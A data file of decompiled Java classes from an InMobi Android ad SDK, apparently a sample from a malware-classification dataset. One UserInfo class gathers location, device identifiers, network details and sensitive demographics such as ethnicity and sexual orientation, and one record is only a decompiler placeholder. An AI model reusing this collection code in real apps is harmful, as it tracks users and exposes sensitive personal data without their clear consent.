"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.bootstrapper\IMAIConfigParams.code","public class IMAIConfigParams {   int a=5;   int b=10;   int c=120;   int d=10;   int e=1000;   public int getmDefaultEventsBatch(){     return this.d;   }   public void setmDefaultEventsBatch(  int i){     this.d=i;   }   public int getmMaxDb(){     return this.e;   }   public void setmMaxDb(  int i){     this.e=i;   }   public int getPingTimeOut(){     return this.c * 1000;   }   public int getMaxRetry(){     return this.a;   }   public int getRetryInterval(){     return this.b * 1000;   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getIntFromMap(map,""mr"",0,2147483647L);     this.b=InternalSDKUtil.getIntFromMap(map,""pint"",1,2147483647L);     this.c=InternalSDKUtil.getIntFromMap(map,""pto"",1,2147483647L);     this.d=InternalSDKUtil.getIntFromMap(map,""eb"",1,2147483647L);     this.e=InternalSDKUtil.getIntFromMap(map,""mdb"",1,2147483647L);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.bootstrapper\Initializer.code","public class Initializer {   public static final String PRODUCT_ADNETWORK=""adNetwork"";   private static Context a=null;   private static Map<String,String> b=new HashMap();   private static Logger c=new Logger(1,""network"");   private static ConfigParams d=new ConfigParams();   private static CacheController.Validator e=new a();   public static Logger getLogger(){     return c;   }   public static ConfigParams getConfigParams(){     if (InternalSDKUtil.getContext() != null && InMobi.getAppId() != null) {       b(InternalSDKUtil.getContext());     }     return d;   }   private static void a(  Context context){     if (context != null && a == null) {       if (a == null) {         a=context.getApplicationContext();         b=getUidMap(context);         try {           b(CacheController.getConfig(PRODUCT_ADNETWORK,context,b,e).getData());           return;         }  catch (        Exception e2) {           return;         }       }       return;     }     if (a == null && context == null) {       throw new NullPointerException();     }   }   private static void b(  Context context){     a(context);     try {       CacheController.getConfig(PRODUCT_ADNETWORK,context,b,e);     }  catch (    Exception e2) {     }   }   public static Map<String,String> getUidMap(  Context context){     return UIDUtil.getMap(context,d.getUID());   }   public static boolean b(  Map<String,Object> map){     b=getUidMap(a);     try {       Map<String,Object> populateToNewMap=InternalSDKUtil.populateToNewMap((Map)map.get(""AND""),(Map)map.get(""common""),true);       ConfigParams configParams=new ConfigParams();       configParams.setFromMap(populateToNewMap);       d=configParams;       c.setMetricConfigParams(configParams.getMetric());       return true;     }  catch (    Exception e2) {       Log.debug(ConfigConstants.LOGGING_TAG,""Config couldn't be parsed"",e2);       return false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.bootstrapper\NativeConfigParams.code","public class NativeConfigParams {   int a=100;   int b=3;   int c=10;   public int getmMaxCacheSize(){     return this.a;   }   public int getmMinLimit(){     return this.b;   }   public int getmFetchLimit(){     return this.c;   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getIntFromMap(map,""mcl"",1,2147483647L);     this.b=InternalSDKUtil.getIntFromMap(map,""mt"",1,2147483647L);     this.c=InternalSDKUtil.getIntFromMap(map,""fl"",1,2147483647L);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl\AdException.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6058da53"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl\ConfigConstants.code","public final class ConfigConstants {   protected static final String CELL=""a"";   protected static final int CELL_CDMA=2;   protected static final int CELL_GSM=1;   protected static final String CELL_ID=""d-n-cell"";   protected static final String CELL_SERVINGID=""a2"";   protected static final String CELL_TYPE=""a1"";   public static final String CONNECTIVITY_INTENT_ACTION=""android.net.conn.CONNECTIVITY_CHANGE"";   public static final String IMAI_CLICK_EVT_FILE=""imai_click_events"";   public static final String IMP_ID_KEY=""im-id"";   public static final String LOGGING_TAG=""[InMobi]-[Network]-4.1.1"";   protected static final Long MIN_NICE_RETRY_INERVAL=3L;   public static final String MSG_AD_ACTIVE=""Interstitial ad is in ACTIVE state. Try again after sometime."";   public static final String MSG_AD_BUSY=""New ad will not be shown because the present ad is busy. Eg. Video/audio is playing, etc."";   public static final String MSG_AD_CLICK=""Ad click in progress. Your request cannot be processed at this time. Try again later."";   public static final String MSG_AD_DOWNLOAD=""Ad download in progress. Your request cannot be processed at this time. Try again later."";   public static final String MSG_AD_FOCUS=""Activity is not in the foreground. New ad will not be loaded."";   public static final String MSG_AD_INVENTORY=""Ad request successful, but no ad was returned due to lack of ad inventory."";   public static final String MSG_AD_SIZE=""Invalid Ad Size. Please provide a valid adSize."";   public static final String MSG_AD_STATE=""Current Ad State is neither default nor loading. New ad will not be shown."";   public static final String MSG_CALL_BACK=""IMAdView not sending callback because the view is not added to any window."";   public static final String MSG_EMPTY_KEY_VALUE=""Key or Value cannot be empty"";   public static final String MSG_INTERSTITIAL_AD_DISPLAYED=""Ad cannot be loaded.Interstitial Ad is displayed."";   public static final String MSG_INVALID_ADVIEW_LAYOUT=""Missing attributes in xml layout of IMAdview "";   public static final String MSG_INVALID_AD_CONFIG=""Interstitial ad is in ACTIVE state. Try again after sometime."";   public static final String MSG_INVALID_AD_SIZE=""Invalid Ad Size. Please provide a valid Ad Size. If Ad Size is declared in the layout XML, please provide a valid 'adSize' attribute in the 'com.inmobi.androidsdk.IMAdView' tag of layout XML. For example, adSize=\""yourAdSize\"""";   public static final String MSG_INVALID_APP_ID=""Your App Id may be invalid or inactive. Please verify the app ID"";   public static final String MSG_INVALID_APP_ID_PARAM=""APP ID cannot be empty.Please provide a valid APP ID. If APP ID is declared in the layout XML, please provide a valid 'appId' attribute in the 'com.inmobi.androidsdk.IMAdView' tag of layout XML. For example, appId=\""yourAppId\"""";   public static final String MSG_INVALID_COLOR_FORMAT=""Invalid color format.Color should be of the format #rgb or #rrggbb "";   public static final String MSG_MISSING_ACCESS_NETWORK_PERMISSION=""App does not have ACCESS_NETWORK_STATE permissions. Please provide ACCESS_NETWORK_STATE permissions"";   public static final String MSG_MISSING_ACTIVITY_DECLARATION=""IMBrowserActivity not declared in the manifest. Please declare it in the app manifest"";   public static final String MSG_MISSING_CONFIG_CHANGES=""IMBrowserActivity in the manifest does not have android:configChanges attributes.Please add android:configChanges=keyboardHidden|orientation|keyboard|screenSize|smallestScreenSize to IMBrowserActivity in the app manifest"";   public static final String MSG_MISSING_CONFIG_KEYBOARD=""Missing Config keyboard from android:configChangesof IMBRowserActivity"";   public static final String MSG_MISSING_CONFIG_KEYBOARDHIDDEN=""Missing Config keyboardHidden from android:configChangesof IMBRowserActivity"";   public static final String MSG_MISSING_CONFIG_ORIENTATION=""Missing Config orientation from android:configChangesof IMBRowserActivity"";   public static final String MSG_MISSING_CONFIG_SCREENSIZE=""Missing Config screenSize from android:configChangesof IMBRowserActivity"";   public static final String MSG_MISSING_CONFIG_SMALLEST_SCREENSIZE=""Missing Config smallestScreenSize from android:configChanges of IMBRowserActivity"";   public static final String MSG_MISSING_INTERNET_PERMISSION=""App does not have INTERNET permissions. Please provide INTERNET permissions"";   public static final String MSG_NIL_ACTIVITY=""Activity cannot be null"";   public static final String MSG_NIL_COLOR=""Color cannot be null"";   public static final String MSG_NIL_KEY_VALUE=""Key or Value cannot be null"";   public static final String MSG_REFRESH=""Ad cannot be refreshed now, as the minimum refresh interval is"";   protected static final int MSG_UPLOAD_NICE_PARAM=1;   protected static final String NICE_RETRY_INTERVAL=""x-retry-count"";   protected static final String NICE_SERVER_URL=""x-inmobi-ph-url"";   protected static final String NICE_UPLOAD_DURATION=""x-inmobi-ph-lse-sec"";   protected static final String NICE_UPLOAD_INTERVAL=""x-inmobi-ph-intvl-sec"";   protected static final String PARAM_RSA_VERSION=""u-key-ver"";   protected static final String PARAM_UID_KEY=""u-id-key"";   protected static final String PARAM_UID_MAP=""u-id-map"";   public static final String QA_MODE_IP=""117.97.87.6"";   protected static final String REQUEST_NICE_PARAM=""x-inmobi-ph-enable"";   public static final String SANDBOX_ERR_KEY=""im-ec"";   protected static final String SIM=""b"";   protected static final String SIM_ID=""d-n-sim"";   protected static final String SIM_OP=""b1"";   public static final String TAP_OFFSET=""u-tap-o"";   public static final String TAP_SIZE=""u-tap-size"";   protected static final String TIME=""d"";   protected static final String TIMESTAMP=""d-n-time"";   protected static final String TIME_UTC=""d1"";   protected static final String TIME_ZONE_OFFSET=""d2"";   protected static final String WIFI=""c"";   protected static final String WIFI_AP=""c1"";   protected static final String WIFI_BSSID=""c1b"";   protected static final String WIFI_ID=""d-n-wifi"";   protected static final String WIFI_LEVEL=""c1c"";   protected static final String WIFI_SSID=""c1a""; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl\ConfigException.code","public final class ConfigException extends Exception {   public static final int MISSING_ACCESS_NETWORK_STATE_PERMISSION=-9;   public static final int MISSING_ACTIVITY_DECLARATION=-2;   public static final int MISSING_CONFIG_CHANGES=-3;   public static final int MISSING_CONFIG_KEYBOARD=-4;   public static final int MISSING_CONFIG_KEYBOARDHIDDEN=-5;   public static final int MISSING_CONFIG_ORIENTATION=-6;   public static final int MISSING_CONFIG_SCREENSIZE=-7;   public static final int MISSING_CONFIG_SMALLEST_SCREENSIZE=-8;   public static final int MISSING_INTERNET_PERMISSION=-1;   private static final long serialVersionUID=1;   private int a;   public ConfigException(  int i){     this.a=i;   }   public int getExceptionCode(){     return this.a;   }   @Override public String toString(){     StringBuffer stringBuffer=new StringBuffer(""IMConfigException : ""); switch (this.a) { case MISSING_ACCESS_NETWORK_STATE_PERMISSION:       stringBuffer.append(ConfigConstants.MSG_MISSING_ACCESS_NETWORK_PERMISSION);     break; case MISSING_CONFIG_SMALLEST_SCREENSIZE:   stringBuffer.append(ConfigConstants.MSG_MISSING_CONFIG_SMALLEST_SCREENSIZE); break; case MISSING_CONFIG_SCREENSIZE: stringBuffer.append(ConfigConstants.MSG_MISSING_CONFIG_SCREENSIZE); break; case MISSING_CONFIG_ORIENTATION: stringBuffer.append(ConfigConstants.MSG_MISSING_CONFIG_ORIENTATION); break; case MISSING_CONFIG_KEYBOARDHIDDEN: stringBuffer.append(ConfigConstants.MSG_MISSING_CONFIG_KEYBOARDHIDDEN); break; case MISSING_CONFIG_KEYBOARD: stringBuffer.append(ConfigConstants.MSG_MISSING_CONFIG_KEYBOARD); break; case MISSING_CONFIG_CHANGES: stringBuffer.append(ConfigConstants.MSG_MISSING_CONFIG_CHANGES); break; case -2: stringBuffer.append(ConfigConstants.MSG_MISSING_ACTIVITY_DECLARATION); break; case -1: stringBuffer.append(ConfigConstants.MSG_MISSING_INTERNET_PERMISSION); break; } return stringBuffer.toString(); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl\ConnBroadcastReciever.code","public class ConnBroadcastReciever extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     if (intent.getAction().equals(""android.net.conn.CONNECTIVITY_CHANGE"") && InternalSDKUtil.checkNetworkAvailibility(context)) {       Log.internal(ConfigConstants.LOGGING_TAG,""Received CONNECTIVITY BROADCAST"");       try {         RequestResponseManager requestResponseManager=new RequestResponseManager();         requestResponseManager.init();         requestResponseManager.processClick(context.getApplicationContext(),null);       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Connectivity receiver exception"",e);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl\SDKUtil.code","public class SDKUtil {   public static final String BROWSER_ACTIVITY=""com.inmobi.androidsdk.IMBrowserActivity"";   public static final long DEFAULT_SLOTID=-1;   private static boolean a=false;   public static void validateAdConfiguration(  Context context) throws ConfigException {     ResolveInfo resolveInfo;     if (context.checkCallingOrSelfPermission(""android.permission.INTERNET"") != 0) {       Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_INTERNET_PERMISSION);       throw new ConfigException(-1);     }     if (context.checkCallingOrSelfPermission(""android.permission.ACCESS_NETWORK_STATE"") != 0) {       Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_ACCESS_NETWORK_PERMISSION);       throw new ConfigException(-9);     }     Iterator<ResolveInfo> it=context.getPackageManager().queryIntentActivities(new Intent(context,(Class<?>)IMBrowserActivity.class),65536).iterator();     while (true) {       if (!it.hasNext()) {         resolveInfo=null;         break;       }  else {         resolveInfo=it.next();         if (resolveInfo.activityInfo.name.contentEquals(BROWSER_ACTIVITY)) {           break;         }       }     }     if (resolveInfo == null) {       Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_ACTIVITY_DECLARATION);       throw new ConfigException(-2);     }     int i=resolveInfo.activityInfo.configChanges;     if (i == 0) {       Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_CONFIG_CHANGES);       throw new ConfigException(-3);     }     if ((i & 16) == 0) {       Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_CONFIG_KEYBOARD);       throw new ConfigException(-4);     }     if ((i & 32) == 0) {       Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_CONFIG_KEYBOARDHIDDEN);       throw new ConfigException(-5);     }     if ((i & a.ACTION_CLEAR_ACCESSIBILITY_FOCUS) == 0) {       Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_CONFIG_ORIENTATION);       throw new ConfigException(-6);     }     if (Build.VERSION.SDK_INT >= 13) {       if ((i & a.ACTION_NEXT_HTML_ELEMENT) == 0) {         Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_CONFIG_SCREENSIZE);         throw new ConfigException(-7);       }       if ((i & a.ACTION_PREVIOUS_HTML_ELEMENT) == 0) {         Log.e(ConfigConstants.LOGGING_TAG,ConfigConstants.MSG_MISSING_CONFIG_SMALLEST_SCREENSIZE);         throw new ConfigException(-8);       }     }   }   public static Activity getRootActivity(  Activity activity){     while (activity.getParent() != null) {       activity=activity.getParent();     }     return activity;   }   private static void setQAMode(  boolean z){     a=z;   }   public static boolean getQAMode(){     return a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl\UserInfo.code","public final class UserInfo {   private String A;   private int B;   private long C;   private Activity D;   boolean a;   private String b;   private String c;   private String d;   private String e;   private String f;   private String g;   private String h;   private String i;   private String j;   private String k;   private LocationManager l;   private double m;   private double n;   private double o;   private boolean p;   private Context q;   private String r;   private AdRequest y;   private String s=null;   private String t=null;   private String u=null;   private String v=null;   private String w=null;   private String x=null;   private Random z=new Random();   public UserInfo(  Activity activity){     this.D=activity;     this.q=activity.getApplicationContext();   }   public Context getApplicationContext(){     return this.q;   }   public String getAppBId(){     return this.b;   }   private void a(  String str){     this.b=str;   }   public String getAppDisplayName(){     return this.c;   }   private void b(  String str){     this.c=str;   }   private void a(  AdRequest adRequest){     this.y=adRequest;   }   public String getAppVer(){     return this.d;   }   private void c(  String str){     this.d=str;   }   public String getNetworkType(){     return this.e;   }   private void d(  String str){     this.e=str;   }   public String getODINId(){     return this.f;   }   public String getRandomKey(){     return this.g;   }   public String getUIDMapEncrypted(){     return this.h;   }   public String getRsakeyVersion(){     return UIDHelper.getRSAKeyVersion();   }   private void e(  String str){     this.f=str;   }   private void a(  int i){     this.g=Integer.toString(i);   }   private void f(  String str){     this.h=str;   }   private void a(  Context context){     try {       if (this.A == null) {         this.A=context.getSharedPreferences(""inmobisdkaid"",0).getString(""A_ID"",null);       }       if (this.A == null) {         this.A=UUID.randomUUID().toString();         SharedPreferences.Editor edit=context.getSharedPreferences(""inmobisdkaid"",0).edit();         edit.putString(""A_ID"",this.A);         edit.commit();       }     }  catch (    Exception e) {     }   }   public String getAid(){     return this.A;   }   public String getLocalization(){     return this.i;   }   private void g(  String str){     this.i=str;   }   private String a(){     return this.j;   }   private void h(  String str){     this.j=str;   }   public Map<String,String> getRequestParams(){     if (this.y != null) {       return this.y.getRequestParams();     }     return null;   }   public String getSiteId(){     return this.k;   }   private void i(  String str){     this.k=str;   }   public String getPostalCode(){     if (this.y != null) {       return this.y.getPostalCode();     }     return null;   }   public String getAreaCode(){     if (this.y != null) {       return this.y.getAreaCode();     }     return null;   }   public String getDateOfBirth(){     if (this.y == null || this.y.getDateOfBirth() == null) {       return null;     }     Calendar dateOfBirth=this.y.getDateOfBirth();     return dateOfBirth.get(1) + ""-"" + (dateOfBirth.get(2) + 1)+ ""-""+ dateOfBirth.get(5);   }   public GenderType getGender(){     if (this.y != null) {       return this.y.getGender();     }     return null;   }   public String getKeywords(){     if (this.y != null) {       return this.y.getKeywords();     }     return null;   }   public String getSearchString(){     if (this.y != null) {       return this.y.getSearchString();     }     return null;   }   public int getIncome(){     if (this.y != null) {       return this.y.getIncome();     }     return 0;   }   public EducationType getEducation(){     if (this.y != null) {       return this.y.getEducation();     }     return null;   }   public EthnicityType getEthnicity(){     if (this.y != null) {       return this.y.getEthnicity();     }     return null;   }   public String getLocationWithCityStateCountry(){     if (this.y != null) {       return this.y.getLocationWithCityStateCountry();     }     return null;   }   public int getAge(){     if (this.y != null) {       return this.y.getAge();     }     return 0;   }   public String getInterests(){     if (this.y != null) {       return this.y.getInterests();     }     return null;   }   private synchronized LocationManager b(){     return this.l;   }   private synchronized void a(  LocationManager locationManager){     this.l=locationManager;   }   private boolean c(){     if (this.y != null) {       return this.y.isLocationInquiryAllowed();     }     return true;   }   private boolean d(){     return this.a;   }   private void a(  boolean z){     this.a=z;   }   public double getLat(){     return this.m;   }   private void a(  double d){     this.m=d;   }   public double getLon(){     return this.n;   }   private void b(  double d){     this.n=d;   }   public double getLocAccuracy(){     return this.o;   }   private void c(  double d){     this.o=d;   }   public boolean isValidGeoInfo(){     return this.p;   }   private void b(  boolean z){     this.p=z;   }   public String getPhoneDefaultUserAgent(){     return this.r == null ? """" : this.r;   }   public synchronized void updateInfo(  String str,  AdRequest adRequest){     a(adRequest);     h();     i(str);     if (adRequest != null) {       b(false);       if (c()) {         if (adRequest.getCurrentLocation() != null) {           a(adRequest.getCurrentLocation());           b(true);         }  else {           g();           if (!d()) {             e();           }         }       }  else {         a(true);       }     }   }   private void e(){     try {       if (b() == null) {         a((LocationManager)getApplicationContext().getSystemService(""location""));       }       if (b() != null) {         LocationManager b=b();         Criteria criteria=new Criteria();         if (getApplicationContext().checkCallingOrSelfPermission(""android.permission.ACCESS_FINE_LOCATION"") == 0) {           criteria.setAccuracy(1);         }  else         if (getApplicationContext().checkCallingOrSelfPermission(""android.permission.ACCESS_COARSE_LOCATION"") == 0) {           criteria.setAccuracy(2);         }         criteria.setCostAllowed(false);         String bestProvider=b.getBestProvider(criteria,true);         if (!isValidGeoInfo() && bestProvider != null) {           Location lastKnownLocation=b.getLastKnownLocation(bestProvider);           Log.debug(ConfigConstants.LOGGING_TAG,""lastBestKnownLocation: "" + lastKnownLocation);           if (lastKnownLocation == null) {             lastKnownLocation=f();             Log.debug(ConfigConstants.LOGGING_TAG,""lastKnownLocation: "" + lastKnownLocation);           }           a(lastKnownLocation);         }       }     }  catch (    Exception e) {       Log.debug(ConfigConstants.LOGGING_TAG,""Error getting the Location Info "",e);     }   }   private Location f(){     Location lastKnownLocation;     if (b() == null) {       a((LocationManager)getApplicationContext().getSystemService(""location""));     }     if (b() != null) {       LocationManager b=b();       List<String> providers=b.getProviders(true);       for (int size=providers.size() - 1; size >= 0; size--) {         String str=providers.get(size);         if (b.isProviderEnabled(str) && (lastKnownLocation=b.getLastKnownLocation(str)) != null) {           return lastKnownLocation;         }       }     }     return null;   }   private void a(  Location location){     if (location != null) {       b(true);       a(location.getLatitude());       b(location.getLongitude());       c(location.getAccuracy());       a(location.getTime());     }   }   private void a(  long j){     this.C=j;   }   private void g(){     int checkCallingOrSelfPermission=getApplicationContext().checkCallingOrSelfPermission(""android.permission.ACCESS_COARSE_LOCATION"");     int checkCallingOrSelfPermission2=getApplicationContext().checkCallingOrSelfPermission(""android.permission.ACCESS_FINE_LOCATION"");     if (checkCallingOrSelfPermission != 0 && checkCallingOrSelfPermission2 != 0) {       a(true);     }  else {       a(false);     }   }   private void h(){     Long l;     String str;     String str2;     if (a() == null) {       h(Build.BRAND);       Locale locale=Locale.getDefault();       String language=locale.getLanguage();       if (language != null) {         str=language.toLowerCase(Locale.ENGLISH);         String country=locale.getCountry();         if (country != null) {           str=str + ""_"" + country.toLowerCase(Locale.ENGLISH);         }       }  else {         String str3=(String)System.getProperties().get(""user.language"");         String str4=(String)System.getProperties().get(""user.region"");         str=(str3 == null || str4 == null) ? language : str3 + ""_"" + str4;         if (str == null) {           str=Values.LANGUAGE;         }       }       g(str);       try {         Context applicationContext=getApplicationContext();         PackageManager packageManager=applicationContext.getPackageManager();         ApplicationInfo applicationInfo=packageManager.getApplicationInfo(applicationContext.getPackageName(),a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);         if (applicationInfo != null) {           a(applicationInfo.packageName);           b(applicationInfo.loadLabel(packageManager).toString());         }         PackageInfo packageInfo=packageManager.getPackageInfo(applicationContext.getPackageName(),a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);         if (packageInfo != null) {           str2=packageInfo.versionName;           if (str2 == null || str2.equals("""")) {             str2=packageInfo.versionCode + """";           }         }  else {           str2=null;         }         if (str2 != null && !str2.equals("""")) {           c(str2);         }       }  catch (      Exception e) {       }     }     e(UIDHelper.getODIN1(UIDHelper.getAndroidId(getApplicationContext())));     a(this.z.nextInt());     int i=0;     if (this.y != null) {       i=com.inmobi.commons.data.UserInfo.getInstance().getDeviceIDMask();     }     HashMap hashMap=new HashMap();     try {       l=AnalyticsInitializer.getConfigParams().getLTVId();     }  catch (    Exception e2) {       Log.internal(ConfigConstants.LOGGING_TAG,""LTVID not available yet in configs"");       l=null;     }     if (l != null) {       hashMap.put(""LTVID"",l + """");     }     f(Initializer.getConfigParams().getUID().getUidMap(i,getRandomKey(),hashMap));     if (this.q != null) {       a(this.q);     }     d(InternalSDKUtil.getConnectivityType(getApplicationContext()));     try {       int currentOrientationInFixedValues=WrapperFunctions.getCurrentOrientationInFixedValues(i());       if (currentOrientationInFixedValues == 9) {         b(2);       }  else       if (currentOrientationInFixedValues == 8) {         b(4);       }  else       if (currentOrientationInFixedValues == 0) {         b(3);       }  else {         b(1);       }     }  catch (    Exception e3) {       Log.debug(ConfigConstants.LOGGING_TAG,""Error getting the orientation info "",e3);     }   }   private Activity i(){     return this.D;   }   public String getRefTagKey(){     return this.s;   }   public void setRefTagKey(  String str){     this.s=str;   }   public String getRefTagValue(){     return this.t;   }   public void setRefTagValue(  String str){     this.t=str;   }   public void setPhoneDefaultUserAgent(  String str){     this.r=str;   }   public String getAdUnitSlot(){     return this.u;   }   public void setAdUnitSlot(  String str){     this.u=str;   }   public String getSlotId(){     return this.v;   }   public void setSlotId(  String str){     this.v=str;   }   public String getScreenSize(){     return this.w;   }   public void setScreenSize(  String str){     this.w=str;   }   public String getScreenDensity(){     return this.x;   }   public void setScreenDensity(  String str){     this.x=str;   }   public int getOrientation(){     return this.B;   }   private void b(  int i){     this.B=i;   }   public long getGeoTS(){     return this.C;   }   public MaritalStatus getMaritalStatus(){     if (this.y != null) {       return this.y.getMaritalStatus();     }     return null;   }   public String getLanguage(){     if (this.y != null) {       return this.y.getLanguage();     }     return null;   }   public SexualOrientation getSexualOrientation(){     if (this.y != null) {       return this.y.getSexualOrientation();     }     return null;   }   public HasChildren getHasChildren(){     if (this.y != null) {       return this.y.getHasChildren();     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.anim\Rotate3dAnimation.code","public class Rotate3dAnimation extends Animation {   private final float a;   private final float b;   private final float c;   private final float d;   private final float e;   private final boolean f;   private Camera g;   public Rotate3dAnimation(  float f,  float f2,  float f3,  float f4,  float f5,  boolean z){     this.a=f;     this.b=f2;     this.c=f3;     this.d=f4;     this.e=f5;     this.f=z;   }   @Override public void initialize(  int i,  int i2,  int i3,  int i4){     super.initialize(i,i2,i3,i4);     this.g=new Camera();   }   @Override protected void applyTransformation(  float f,  Transformation transformation){     float f2=this.a;     float f3=f2 + ((this.b - f2) * f);     float f4=this.c;     float f5=this.d;     Camera camera=this.g;     Matrix matrix=transformation.getMatrix();     camera.save();     if (this.f) {       camera.translate(0.0f,0.0f,this.e * f);     }  else {       camera.translate(0.0f,0.0f,this.e * (1.0f - f));     }     camera.rotateX(f3);     camera.getMatrix(matrix);     camera.restore();     matrix.preTranslate(-f4,-f5);     matrix.postTranslate(f4,f5);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.anim\Rotate3dAnimationVert.code","public class Rotate3dAnimationVert extends Animation {   private final float a;   private final float b;   private final float c;   private final float d;   private final float e;   private final boolean f;   private Camera g;   public Rotate3dAnimationVert(  float f,  float f2,  float f3,  float f4,  float f5,  boolean z){     this.a=f;     this.b=f2;     this.c=f3;     this.d=f4;     this.e=f5;     this.f=z;   }   @Override public void initialize(  int i,  int i2,  int i3,  int i4){     super.initialize(i,i2,i3,i4);     this.g=new Camera();   }   @Override protected void applyTransformation(  float f,  Transformation transformation){     float f2=this.a;     float f3=f2 + ((this.b - f2) * f);     float f4=this.c;     float f5=this.d;     Camera camera=this.g;     Matrix matrix=transformation.getMatrix();     camera.save();     if (this.f) {       camera.translate(0.0f,0.0f,this.e * f);     }  else {       camera.translate(0.0f,0.0f,this.e * (1.0f - f));     }     camera.rotateY(f3);     camera.getMatrix(matrix);     camera.restore();     matrix.preTranslate(-f4,-f5);     matrix.postTranslate(f4,f5);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.anim\TranslateAnimation.code","public class TranslateAnimation extends Animation {   private int a;   private int b;   private int c;   private int d;   private float e;   private float f;   private float g;   private float h;   private float i;   private float j;   private float k;   private float l;   public TranslateAnimation(  float f,  float f2,  float f3,  float f4){     this.a=0;     this.b=0;     this.c=0;     this.d=0;     this.e=0.0f;     this.f=0.0f;     this.g=0.0f;     this.h=0.0f;     this.e=f;     this.f=f2;     this.g=f3;     this.h=f4;     this.a=0;     this.b=0;     this.c=0;     this.d=0;   }   public TranslateAnimation(  int i,  float f,  int i2,  float f2,  int i3,  float f3,  int i4,  float f4){     this.a=0;     this.b=0;     this.c=0;     this.d=0;     this.e=0.0f;     this.f=0.0f;     this.g=0.0f;     this.h=0.0f;     this.e=f;     this.f=f2;     this.g=f3;     this.h=f4;     this.a=i;     this.b=i2;     this.c=i3;     this.d=i4;   }   @Override public void initialize(  int i,  int i2,  int i3,  int i4){     super.initialize(i,i2,i3,i4);     this.i=resolveSize(this.a,this.e,i,i3);     this.j=resolveSize(this.b,this.f,i,i3);     this.k=resolveSize(this.c,this.g,i2,i4);     this.l=resolveSize(this.d,this.h,i2,i4);   }   @Override protected void applyTransformation(  float f,  Transformation transformation){     float f2=this.i;     float f3=this.k;     if (this.i != this.j) {       f2=this.i + ((this.j - this.i) * f);     }     if (this.k != this.l) {       f3=this.k + ((this.l - this.k) * f);     }     transformation.getMatrix().setTranslate(f2,f3);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.imai\a.code","public static class a implements Runnable {   final String a;   final boolean b;   final WeakReference c;   a(  String str,  boolean z,  WeakReference weakReference){     this.a=str;     this.b=z;     this.c=weakReference;   }   @Override public void run(){     try {       ClickData clickData=new ClickData(this.a,this.b,false,Initializer.getConfigParams().getImai().getMaxRetry());       RequestResponseManager requestResponseManager=new RequestResponseManager();       requestResponseManager.init();       RequestResponseManager.mNetworkQueue.add(0,clickData);       requestResponseManager.processClick(InternalSDKUtil.getContext(),new C0020a());     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception ping in background"",e);     }   } class C0020a implements HttpRequestCallback {     C0020a(){     }     @Override public void notifyResult(    int i,    Object obj){       try {         Log.internal(ConfigConstants.LOGGING_TAG,""Got PING callback. Status: "" + i);         if (i == 0) {           IMAICore.firePingSuccessful(a.this.c,a.this.a);         }  else {           IMAICore.fireErrorEvent(a.this.c,""IMAI Ping in http client failed"",""ping"",a.this.a);         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);       }     }   } } class a implements HttpRequestCallback {   a(){   }   @Override public void notifyResult(  int i,  Object obj){     try {       Log.internal(ConfigConstants.LOGGING_TAG,""Got PING IN WEBVIEW callback. Status: "" + i);       if (i == 0) {         IMAICore.firePingInWebViewSuccessful(b.this.c,b.this.a);       }  else {         IMAICore.fireErrorEvent(b.this.c,""IMAI Ping in webview failed"",""pingInWebview"",b.this.a);       }     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception"",e);     }   } } "
